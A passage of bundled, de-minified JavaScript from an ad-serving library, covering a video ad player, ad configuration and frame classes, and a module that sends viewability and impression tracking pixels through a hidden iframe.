          return u.set(t, r), r.di = e.di, r.prefix = e.prefix, r.playerOpts = e.options || {}, r.playerOpts.muted = !0, r.playerOpts.centerPlayButton = r.playerOpts.centerPlayButton || !1, r.playerOpts.customControls = void 0 === r.playerOpts.customControls || r.playerOpts.customControls, r.trackingDisabled = !!r.playerOpts && r.playerOpts.disableTracking, t._promises = [], t._deffer = {}, t._promises.push(new Promise(function (e, r) {
            t._deffer.resolve = e, t._deffer.reject = r;
          })), t._isMuted = r.playerOpts.muted || !1, t._isPlaying = !1, t._started = !1, t._videoCursorPosition = 0, t._playCount = 0, r.isPlayClicked = !1, r.pastEvents = {
            completed: !1,
            firstQuartile: !1,
            midpoint: !1,
            started: !1,
            thirdQuartile: !1
          }, r.videoNewControls = !1, r.playerOpts.newControls = void 0 !== r.playerOpts.newControls && r.playerOpts.newControls, r.playerOpts.newControls && (r.isFullscreen = r.playerOpts.newControls.bindFullscreenEvent, r.isHalfscreen = r.playerOpts.newControls.bindHalfscreenEvent), r.onVideoControls = !1, r.onFullscreen = !1, r.videoBackup = !1, r.videoControls = {
            fullscreen: [],
            play: [],
            progress: {
              tag: []
            },
            volume: [],
            volumeBar: {
              bar: [],
              slider: []
            }
          }, r.videoEnded = !1, r.videoPlayBtnClicked = !1, r.videoSoundDecreased = !1, r.videoVolumeBarBtnDown = !1, r.videoVolumeBtnClicked = !1, r.progressBarInterval = function () {}, r.isCustomApiVideo = !!r.playerOpts.isCustomApiVideo, r.apiVtrResetOnEnd = !!r.playerOpts.vtrResetOnEnd, r.apiVideoPlayedOnce = !1, r.apiVideoHasLoop = !1, r.apiRewindFiredOnce = !1, r;
        }, t.prototype._updateVolume = function (e) {
          this.returnVideoContainerElm().volume = e / 100;
        }, t.prototype._updateVolumeBar = function (e, t) {
          var r = this,
            n = u.get(r),
            o = n.videoControls.volumeBar.bar[0].getDOMElement(),
            i = t || o.getBoundingClientRect().left,
            a = r.isMuted(),
            s = e - i,
            c = Math.round(100 * s / o.clientWidth);
          c > 100 && (c = 100), c < 0 ? (c = 0, a || (n.videoSoundDecreased = !0, r.mute(), r._changeVideoVolumeBtn(!0))) : a && (n.videoSoundDecreased = !1, r.unmute(), r._changeVideoVolumeBtn(!1)), n.videoControls.volumeBar.slider.forEach(function (e) {
            e.setStyle("width", c + "%");
          }), r._updateVolume(c);
        }, t.prototype._updateVolumeSlider = function () {
          var e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0],
            t = u.get(this),
            r = e ? 0 : 100;
          this._updateVolume(r), t.videoControls.volumeBar.slider.forEach(function (e) {
            e.setStyle("width", r + "%");
          });
        }, t.prototype.createAdditionalVideo = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
            n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null,
            o = this,
            i = u.get(o),
            a = i.di.jDOM,
            s = n || o.getSources();
          if (!s) return !1;
          o._isMuted = !0;
          var c = {
              listener: function () {
                o.isPlaying() && (o._isPlaying = !0);
              }
            },
            l = {},
            d = {},
            p = {},
            f = {},
            h = {
              src: s
            };
          if ("jp-video-backup" === e) {
            i.isBackupVideo = !0, i.videoNewControls = !0, i.playerOpts.newControls = {}, i.playerOpts.newControls.bindFullscreenEvent = !0;
            c = {
              listener: function (e) {
                if (o.isPlaying() && (o._isPlaying = !0, i.isBackupVideo)) if (o.publish("play", [e]), o._changeVideoPlayBtn(!0), o._started) o.publish("resume", [e]);else {
                  o._started = !0, o._videoCursorPosition = 0, o._playCount++, o._playCount > 1 && o.publish("rewind", [e]);
                  var t = i.pastEvents;
                  t.started || (t.started = !0, o.publish("start", [e]));
                }
              }
            }, l = {
              listener: function (t) {
                o._isPlaying = !1, o._changeVideoPlayBtn(!1), "jp-video-backup" === e && o.publish("pause", [t]);
              }
            }, d = {
              listener: function (t) {
                o._isPlaying = !1, o._started = !1, o._changeVideoPlayBtn(!1), i.videoControls.progress.tag.forEach(function (e) {
                  e.value = 0;
                }), "jp-video-backup" === e && o.publish("ended", [t]);
              }
            }, p = {
              listener: function (e) {
                o.publish("loaded", [e]);
              }
            }, f = {
              listener: function (e) {
                o.publish("progress", [e]), i.videoControls.progress.tag.forEach(function (e) {
                  var t = e.getDOMElement();
                  t.max !== o.getDuration() && (t.max = o.getDuration()), i.videoStructure && i.videoStructure.container && (t.value = i.videoStructure.container.getDOMElement().currentTime);
                });
              }
            }, h.muted = !0, h.playsinline = !0, h.autoplay = !0;
          }
          a.createElement(e, {
            tag: "div",
            parent: t,
            attributes: {
              class: e + " " + r
            }
          }).createElement(e + "-element", {
            tag: "video",
            parent: e,
            events: {
              canplay: p,
              timeupdate: f,
              play: c,
              pause: l,
              ended: d
            },
            attributes: h,
            properties: {
              muted: "true"
            }
          }), i.videoStructure = {}, i.videoStructure.wrapper = a.getElement(e), i.videoStructure.container = a.getElement(e + "-element");
        }, t.prototype.createVideoControls = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            n = u.get(this);
          r && (n.videoControls = {
            fullscreen: [],
            play: [],
            progress: {
              tag: []
            },
            volume: [],
            volumeBar: {
              bar: [],
              slider: []
            }
          }), this._createVideoControlsWrapper(e, t);
        }, t.prototype.getCurrentTime = function () {
          var e = u.get(this).di.jDOM.getElement(this.getPrefix() + "container-" + this.getId()).getDOMElement();
          return e ? !0 === isNaN(e.currentTime) ? 0 : e.currentTime : 0;
        }, t.prototype.getCurrentTimeInPercent = function () {
          var e = this.getDuration(),
            t = this.getCurrentTime(),
            r = parseFloat(t / e * 100);
          return !0 === isNaN(r) ? 0 : r;
        }, t.prototype.getDuration = function () {
          var e = this;
          if (e._duration) return e._duration;
          var t = u.get(e).di.jDOM.getElement(e.getPrefix() + "container-" + e.getId()).getDOMElement();
          return t ? (e._duration = t.duration, !0 === isNaN(e._duration) ? 0 : e._duration) : 0;
        }, t.prototype.getPrefix = function () {
          return this._prefix;
        }, t.prototype.getPlayerHeight = function () {
          return this.returnVideoContainer().getDOMElement().offsetHeight;
        }, t.prototype.getPlayerWidth = function () {
          return this.returnVideoContainer().getDOMElement().offsetWidth;
        }, t.prototype.getSources = function () {
          return this.returnVideoContainerElm().currentSrc;
        }, t.prototype.getVideoHeight = function () {
          return this.returnVideoContainer().getDOMElement().videoHeight;
        }, t.prototype.getVideoWidth = function () {
          return this.returnVideoContainer().getDOMElement().videoWidth;
        }, t.prototype.isAutoplayAllowed = function () {
          var e = u.get(this);
          return "boolean" != typeof e.playerOpts.autoplay || e.playerOpts.autoplay;
        }, t.prototype.isMuted = function () {
          return this._isMuted;
        }, t.prototype.isPaused = function () {
          return u.get(this).di.jDOM.getElement(this.getPrefix() + "container-" + this.getId()).getDOMElement().paused;
        }, t.prototype.isPlayBtnClicked = function () {
          return u.get(this).isPlayClicked;
        }, t.prototype.isPlaying = function () {
          return this._isPlaying;
        }, t.prototype.mute = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null,
            t = this,
            r = u.get(t),
            n = r.di.jDOM,
            o = n.getElement(t.getPrefix() + "container-" + t.getId()).getDOMElement();
          return "remove" === e && t._changeVideoVolumeBtn(!0), t._isMuted = !0, o.muted = !0, t.publish("mute", [t, o]), r.playerOpts.customControls && n.getElement(t.getPrefix() + "control-mute-" + t.getId()).removeClass("jpx-video-control-unmuted"), t;
        }, t.prototype.pause = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null,
            t = this,
            r = u.get(t),
            n = r.di.jDOM,
            o = n.getElement(t.getPrefix() + "container-" + t.getId()).getDOMElement();
          "add" === e && t._changeVideoPlayBtn(!1), t._isPlaying = !1, r.progressBarInterval(), r.playerOpts.customControls && n.getElement(t.getPrefix() + "control-play-" + t.getId()).addClass("jpx-video-control-play"), r.playerOpts.centerPlayButton && n.getElement(t.getPrefix() + "controls-button-play-" + t.getId()).addClass(t.getPrefix() + "control-play-visible");
          var i = o.pause();
          void 0 !== i && i.catch(function (e) {});
        }, t.prototype.play = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : null,
            t = this,
            r = u.get(t),
            n = r.di.jDOM,
            i = void 0,
            a = n.getElement(t.getPrefix() + "container-" + t.getId());
          if (-1 !== a && (i = a.getDOMElement()), r.isBackupVideo && (i = (a = n.getElement("jp-video-backup-element")).getDOMElement()), t.isAutoplayAllowed() || t.isPlayBtnClicked()) {
            "remove" === e && t._changeVideoPlayBtn(!0), r.viewable || (r.viewableTracking = o.default.delay(t, function () {
              t.publish("viewable"), r.viewable = !0;
            }, 2e3)), t._isPlaying = !0, t.progressBarMove(), r.playerOpts.customControls && (n.getElement(t.getPrefix() + "control-play-" + t.getId()).removeClass("jpx-video-control-play"), n.getElement(t.getPrefix() + "control-play-" + t.getId()).removeClass("jpx-video-control-reload")), r.playerOpts.centerPlayButton && n.getElement(t.getPrefix() + "controls-button-play-" + t.getId()).removeClass(t.getPrefix() + "control-play-visible");
            var s = i.play();
            void 0 !== s && s.catch(function (e) {
              t.pause("add");
            });
          }
        }, t.prototype.progressBarMove = function () {
          var e = this;
          u.get(e).progressBarInterval = o.default.delay(e, function () {
            e.publish("progress"), e.progressBarMove();
          }, 16);
        }, t.prototype.ready = function () {
          return Promise.all(this._promises);
        }, t.prototype.returnVideoContainer = function () {
          return u.get(this).di.jDOM.getElement("jp-video-container-" + this.getId());
        }, t.prototype.returnVideoContainerElm = function () {
          return this.returnVideoContainer().getDOMElement();
        }, t.prototype.returnVideoElement = function () {
          return this.returnVideoWrapper().getDOMElement();
        }, t.prototype.returnVideoParentElm = function () {
          return -1 !== this.returnVideoWrapper() && this.returnVideoWrapper().getDOMElement();
        }, t.prototype.returnVideoWrapper = function () {
          var e = u.get(this).di.jDOM,
            t = e.getElement("jp-video-wrapper-" + this.getId()),
            r = e.getElement("jp-video-backup");
          return -1 !== r ? r : t;
        }, t.prototype.started = function () {
          var e = u.get(this);
          return !this._isPlaying && !this._started && e.videoNewControls && !e.onVideoControls;
        }, t.prototype.unbindEvents = function () {
          var e = u.get(this);
          e.blurEvent && e.blurEvent(), e.focusEvent && e.focusEvent(), e.webkitfullscreenchangeEvent && e.webkitfullscreenchangeEvent(), e.fullscreenchangeEvent && e.fullscreenchangeEvent(), e.halfscreenResizeEvent && e.halfscreenResizeEvent(), e.mouseupEvent && e.mouseupEvent();
        }, t.prototype.unmute = function () {
          var e = this,
            t = u.get(e),
            r = t.di.jDOM,
            n = r.getElement(e.getPrefix() + "container-" + e.getId()).getDOMElement();
          return e._isMuted = !1, n.muted = !1, e.publish("unmute", [e, n]), t.playerOpts.customControls && -1 !== r.getElement(e.getPrefix() + "video-control-mute") && r.getElement(e.getPrefix() + "video-control-mute").addClass("jpx-video-control-unmuted"), e;
        }, t.prototype.requestFullscreen = function (e) {
          var t = this;
          e ? (t.publish("exitFullscreen"), t._requestFullscreen(!1), t._changeVideoFullscreenBtn(!1)) : (t.publish("requestFullscreen"), t._requestFullscreen(!0), t._changeVideoFullscreenBtn(!0));
        }, t.prototype.setup = function (e, t) {
          var r = this,
            n = u.get(r);
          r._setPrefix(n.prefix), r._createVideoWrapper(e), r._prepareVideo(), n.playerOpts.customControls && r._createButtonsContainer(), n.playerOpts.centerPlayButton && r._createCenterPlayButton(e), n.playerOpts.newControls ? (n.videoNewControls = !0, r._createVideoControlsWrapper("main", "jp-video-wrapper-" + r.getId()), r._bindMouseEvent(), r._bindBlurEvent(t), r._bindFocusEvent(), n.isFullscreen && r._bindFullscreenEvent(), n.isHalfscreen && r._bindHalfscreenEvent(), r.isAutoplayAllowed() || r._changeVideoPlayBtn(!1)) : (r._bindMuteEvent(t), r._bindFocusEvent(!0));
        }, t;
      }(n.default);
    t.default = p;
  },
  27: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n]);
        }
        return e;
      },
      o = s(r(79)),
      i = s(r(1)),
      a = s(r(16));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function c(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var l = new WeakMap(),
      d = new WeakMap(),
      u = i.default.getTopScope(),
      p = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var o = r.model;
          r.product && r.product.limits && n({}, r.product.limits), o.site = r.global.site;
          var i = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this, {
            data: o
          }));
          return d.set(i, o), i;
        }
        return c(t, e), t.prototype._loadData = function () {
          var t = this,
            r = l.get(t);
          return e.prototype._loadData.call(this).then(function () {
            var e = r.di.scope,
              n = t.getData("creative"),
              o = n && n.creativeId || t.getData("zoneId") || null,
              i = o && u.jpCreativeVars && u.jpCreativeVars[o] && u.jpCreativeVars[o].config,
              s = e && e.jpx_ad_config || window.jpx_ad_config || u.jpx_ad_config || i;
            s ? t.addProperty("jpxConfig", !0) : a.default.info("JModelConfig: There is no jpxConfig.");
            try {
              window.top.jpx_ad_config = null;
            } catch (e) {}
            return t._setConfig(s), s;
          });
        }, t.prototype._setPrivates = function (t) {
          var r = e.prototype._setPrivates.call(this, t);
          return l.set(this, r), r;
        }, t.prototype._getClickUrl = function () {
          var e = /href="(.*?)"/.exec(this.getCreative());
          return (e = e || /href='(.*?)'/.exec(this.getCreative())) && e[1] ? e[1] : "";
        }, t.prototype._setConfig = function (e) {
          var t = d.get(this);
          return t.config = e || {}, t.config.clickURL || (t.config = t.config || {}, t.config.clickURL = this._getClickUrl()), this.publish("setConfig", [t.config]), this;
        }, t.prototype.setScope = function (e) {
          l.get(this).di.scope = e;
        }, t;
      }(o.default);
    t.default = p;
  },
  32: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = u(r(106)),
      o = u(r(4)),
      i = u(r(79)),
      a = u(r(47)),
      s = (u(r(16)), u(r(18))),
      c = u(r(1)),
      l = u(r(107)),
      d = u(r(108));
    function u(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function p(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var f = c.default.getTopScope(),
      h = new WeakMap(),
      g = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n,
            i = {},
            a = (r = r || {}).di || {};
          return o._validateConstructorArguments(r), h.set(o, i), i.di = a, o._setPrefix(), n;
        }
        return p(t, e), t.prototype._addAdSafePixel = function () {
          var e = h.get(this).di,
            t = e.jAdFrame,
            r = e.jDOM,
            n = e.jModel;
          if (n.getData("loadAdSafeFromProduct")) {
            var o = t.getJDOMElement("adframe").getDOMElement(),
              i = l.default.returnFrameInnerHTML(o),
              a = n.getFormat(),
              s = n.getData("ssp");
            if (d.default.isAdSafeAllowed(a, s, i)) {
              var c = "";
              if (n.getData("trackerId")) c = n.getData("trackerId");else {
                var u = o.contentWindow;
                c = u.trackerId ? u.trackerId : "";
              }
              var p = {
                  iasAdPath: t.getJDOMElement("wrapper").getId(),
                  format: a,
                  html: i,
                  chanId: n.getData("zoneId") ? n.getData("zoneId") : "",
                  trackerId: c
                },
                f = void 0,
                g = void 0;
              "wp" === a ? g = r.getElement("jpx-wp-layer-left-container") : "mt" === a && (g = r.getElement("jpx-mt-bottom-content")), f = g && -1 !== g && -1 !== g.getDOMElement() ? g.getDOMElement() : t.getJDOMElement("wrapper").getDOMElement(), this.subscribe("afterShow", function () {
                d.default.addAdSafePixel(f, p);
              });
            }
          }
        }, t.prototype._afterShow = function () {
          var e = h.get(this).di,
            t = e.jDOM,
            r = e.jAdFrame.getJDOMElement("wrapper");
          return this.publish("afterShow", [this, t, r]), this;
        }, t.prototype._beforeShow = function () {
          var e = this,
            t = h.get(e).di,
            r = t.jDOM,
            n = t.jAdFrame;
          return e._addAdSafePixel(), e.publish("beforeShow", [e, r, n]), e;
        }, t.prototype._setPrefix = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "setPrefix"
          });
        }, t.prototype._show = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "_show"
          });
        }, t.prototype._validateConstructorArguments = function (e) {
          var t = e.di || {};
          if (!(t.jDOM instanceof n.default)) throw this.error(100, {
            class: this.constructor.name,
            parameter: "jDOM",
            instance: "JDOM"
          });
          if (!(t.jModel instanceof i.default)) throw this.error(100, {
            class: this.constructor.name,
            parameter: "jModel",
            instance: "JModel"
          });
        }, t.prototype.appendTo = function (e) {
          return h.get(this).di.jDOM.appendTo(e), this.publish("afterAppend", [this]), this;
        }, t.prototype.bindEvents = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "bindEvents"
          });
        }, t.prototype.bindGumGumEvents = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "bindGumGumEvents"
          });
        }, t.prototype.destroy = function () {
          var e = h.get(this).di;
          f.jPAM && f.jPAM.removeAdFromTrackingList && f.jPAM.removeAdFromTrackingList(e.jModel.getFormat()), e.jDOM.restoreProperties(), e.jDOM.destroy(), e.jAdFrame.destroy(), this.publish("afterDestroy", [this]);
        }, t.prototype.getPrefix = function () {
          return this._prefix;
        }, t.prototype.hide = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "hide"
          });
        }, t.prototype.render = function () {
          var e = this,
            t = h.get(e).di;
          return e.publish("beforeDOMRender", [e, t.jDOM]), t.jDOM.renderDOM(), e.bindEvents(), e.bindGumGumEvents(), e.publish("afterDOMRender", [e, t.jDOM]), e;
        }, t.prototype.setup = function () {
          throw this.error(104, {
            class: t.constructor.name,
            method: "setup"
          });
        }, t.prototype.show = function () {
          this._beforeShow(), this._show(), this._afterShow();
        }, t.factory = function (e) {
          return new (0, e.di.constructor)({
            di: e.di
          });
        }, t.getModel = function (e) {
          var t = e.product,
            r = e.model;
          return r.width = t.width, r.height = t.height, r.site = e.global.site, r.productWidth = t.width, r.productHeight = t.height, new i.default({
            data: r
          });
        }, t.getAdFrame = function (e) {
          return new a.default(e);
        }, t.getProductApi = function (e) {
          return new s.default(e);
        }, t;
      }(o.default);
    t.default = g;
  },
  33: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = d(r(4)),
      o = d(r(106)),
      i = d(r(1)),
      a = d(r(16)),
      s = d(r(209)),
      c = d(r(422)),
      l = d(r(85));
    function d(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var p = new WeakMap(),
      f = 0,
      h = void 0,
      g = !1,
      v = i.default.getTopScope(),
      m = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            o = n,
            i = {},
            a = r.di || {};
          return o._validateConstructorArguments(r), p.set(o, i), i.di = a, o._createContainer(), i.gumgumTrackingEvents = !1, n;
        }
        return u(t, e), t.prototype._createContainer = function () {
          var e = p.get(this).di,
            t = e.jDOM,
            r = e.window.document;
          return t.createElement("pixel-iframe", {
            tag: "iframe",
            parent: "@root",
            attributes: {
              class: "tracking-iframe-" + this.getId(),
              style: "visibility: hidden; height: 0px; overflow: hidden; position: fixed; left: -9999px; top: -9999px;"
            }
          }), r.body ? (t.renderDOM(), t.appendTo(e.window.document.body), this) : (r.addEventListener("DOMContentLoaded", function () {
            t.renderDOM(), t.appendTo(e.window.document.body);
          }, !1), this);
        }, t.prototype._loadPixel = function (e, t) {
          var r = this,
            n = (p.get(r), p.get(r).di.jDOM),
            o = "pixel-" + f++;
          return a.default.info("JTracking: Sending tracking for action `" + e + "`"), n.createElement(o, {
            tag: "img",
            parent: "pixel-iframe",
            events: {
              load: {
                listener: function () {
                  r.publish("trackingCalled", [r, o, n.getElement(o)]);
                }
              }
            }
          }).getElement(o).getDOMElement().setAttribute("src", t), r;
        }, t.prototype._validateConstructorArguments = function (e) {
          var t = e.di || {};
          if (!(t.jDOM instanceof o.default)) throw this.error(100, {
            class: this.constructor.name,
            parameter: "jDOM",
            instance: "JDOM"
          });
          if (!t.window) throw this.error(100, {
            class: this.constructor.name,
            parameter: "window",
            instance: "Window"
          });
        }, t.prototype.trackRaw = function (e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "default",
            r = e.type;
          if (!s.default.blockTrackingOnPreviewPage(e.type)) {
            var n = {};
            n = "viewability" === t ? this.getViewabilityRawPixelUrl(e) : this.getRawPixelUrl(e), this._loadPixel(r, n), "cl" === r && this.loadGumGumPixel("clickUrl");
          }
        }, t.prototype.getViewabilityRawPixelUrl = function (e) {
          var t = "https://";
          ["http:"].indexOf(v.location.protocol) > -1 && (t = "http://");
          var r = t + e.trackingUrl;
          return r += "?rid=" + e.get("rid") + "&sid=" + e.get("sid") + "&uid=" + e.get("uid") + "&vr=" + e.get("vr") + "&fc=" + e.get("format") + "&cid=" + e.get("cid") + "&tid=" + e.get("trackerId") + "&adv=" + e.get("isAdv") + "&aid=" + e.get("aid") + "&zid=" + e.get("zoneId") + "&cy=" + e.get("country") + "&dn=" + e.get("domain") + "&to=" + e.get("total") + "&tiv=" + e.get("totalInView") + "&l=" + e.get("left") + "&r=" + e.get("right") + "&c=" + e.get("center") + "&t=" + e.get("top") + "&b=" + e.get("bottom") + "&le=" + e.get("leftExpanded") + "&re=" + e.get("rightExpanded") + "&ce=" + e.get("centerExpanded") + "&te=" + e.get("topExpanded") + "&be=" + e.get("bottomExpanded") + "&tt=tiv";
        }, t.prototype.getRawPixelUrl = function (e) {
          var t = (-1 === ["https:", "http:"].indexOf(v.location.protocol) ? "http:" : v.location.protocol) + e.trackingUrl;
          return e.setPageHeight(i.default.getDocumentHeight()), t += "?rid=" + e.get("rid") + "&sid=" + e.get("sid") + "&uid=" + e.get("uid") + "&vr=" + e.get("vr") + "&ru=" + encodeURIComponent((v.location.href || "").replace(/#/g, "")) + "&tt=" + +new Date() + "&siw=" + e.get("siteWidth") + "&sh=" + i.default.getScreenHeight() + "&sw=" + i.default.getScreenWidth() + "&wh=" + i.default.getWindowHeight() + "&ww=" + i.default.getWindowWidth() + "&an=" + e.get("app") + "&vn=" + e.get("cluster") + "&sd=" + e.get("subDomain") + "&_c=a" + Math.random().toString(36).substring(7) + +new Date() + "&et=&aid=" + e.get("adId") + "&said=" + e.get("sourceId") + "&ei=" + encodeURIComponent(e.get("placementId")) + "&fc=" + e.get("format") + "&sp=" + e.get("ssp") + "&at=" + e.get("at") + "&cid=" + e.get("cid") + "&ist=" + e.get("isTest") + "&mg=" + encodeURIComponent(e.get("errorCode") || e.get("message") || "") + "&dl=&dlt=&ev=&vt=&zid=" + e.get("zoneId") + "&dr=" + (+new Date() - e.get("registeredAt")) + "&di=" + e.get("dealId") + "&pr=" + e.get("price") + "&cw=" + e.get("creativeWidth") + "&ch=" + e.get("creativeHeight") + "&nt=" + i.default.getNavigatorTrack() + "&st=" + encodeURIComponent(e.get("stack") || "") + "&jp=" + encodeURIComponent(e.get("jsonParams") || "") + "&ty=" + e.type;
        }, t.prototype.getPixelUrl = function (e, t, r, n, o) {
          if (g) return this;
          var i = l.default.factory(e, t, r, n, o);
          return this.getRawPixelUrl(i);
        }, t.prototype.loadGumGumPixel = function (e) {
          var t = p.get(this).gumgumTrackingEvents;
          t && t[e] ? this._loadPixel(e, t[e]) : c.default.sendTracking(e);
        }, t.prototype.track = function (e, t, r, n, o, i, a) {
          var s = p.get(this);
          if (g) return this;
          if (n && n.getData) {
            var c = n.getData().trackingEvents;
            c && !s.gumgumTrackingEvents && (s.gumgumTrackingEvents = c);
          }
          i = i || "";
          var d = l.default.factory(e, t, r, n, null, a);
          return d.set("stack", i), d.set("errorCode", o), this.trackRaw(d);
        }, t.prototype.externalTrack = function (e, t) {
          return g ? this : this._loadPixel(e, t);
        }, t.disabled = function (e) {
          return g = e;
        }, t.instance = function (e) {
          return h = h || function () {
            var r = {};
            return (e = e || {}).di = e.di || {}, r.di = {}, r.di.window = e.di.window || v, r.di.jDOM = e.di.jDOM || new o.default({
              di: {
                window: r.di.window
              }
            }), new t(r);
          }();
        }, t;
      }(n.default);
    t.default = m;
  },
  38: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(79)),
      o = i(r(16));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var s = new WeakMap(),
      c = new WeakMap(),
      l = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, {
              data: r.data
            })),
            o = n,
            i = r.data || {};
          return c.set(o, i), n;
        }
        return a(t, e), t.prototype._setPrivates = function (t) {
          var r = e.prototype._setPrivates.call(this, t);
          return s.set(this, r), r;
        }, t.prototype._loadData = function () {
          var e = this,
            t = s.get(e),
            r = c.get(e);
          if (e.publish("beforeDataLoad", r), r.sources && r.sources.length) t.resolve(r.creative), e.publish("adLoaded", [e], .01);else {
            var n = e.error(200, {
              class: e.constructor.name,
              method: "_loadData"
            });
            o.default.info("JModel: Loading data failed."), o.default.error(n), t.reject(n), e.publish("adError", [n], .1);
          }
          return t.ready;
        }, t;
      }(n.default);
    t.default = l;
  },
  4: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(419)),
      o = i(r(420));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    var a = new WeakMap(),
      s = {
        counter: 1,
        get: function () {
          return "o" + this.counter++;
        }
      },
      c = function () {
        function e() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, e), a.set(this, {
            id: "a" + Math.random().toString(36).substring(7) + s.get(),
            events: new n.default()
          });
        }
        return e.prototype.error = function (t, r) {
          var n = new Error(e._getMsgByCode(t, r));
          return n.code = t, n;
        }, e.prototype.fnFactory = function (e, t) {
          return function (t) {
            return function () {
              t[e].apply(t, arguments);
            };
          }(t || this);
        }, e.prototype.subscribe = function (e, t) {
          return a.get(this).events.subscribe(e, t);
        }, e.prototype.publish = function (e, t, r) {
          return a.get(this).events.publish(e, t, r, !1);
        }, e.prototype.broadcast = function (e, t) {
          var r = this;
          e.subscribe(t, function (e) {
            r.publish(t, e);
          });
        }, e.prototype.getId = function () {
          return a.get(this).id;
        }, e.prototype.destroy = function () {
          a.get(this).events.destroy();
        }, e._getMsgByCode = function (e, t) {
          var r = o.default[e];
          for (var n in t) t.hasOwnProperty(n) && (r = r.replace(new RegExp("\\${" + n + "}", "g"), t[n]));
          return r;
        }, e.getType = function (e) {
          var t = void 0;
          return null === e ? "[object Null]" : (t = Object.prototype.toString.call(e)) ? t.split(" ").pop().slice(0, -1) : "undefined";
        }, e;
      }();
    t.default = c;
  },
  418: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
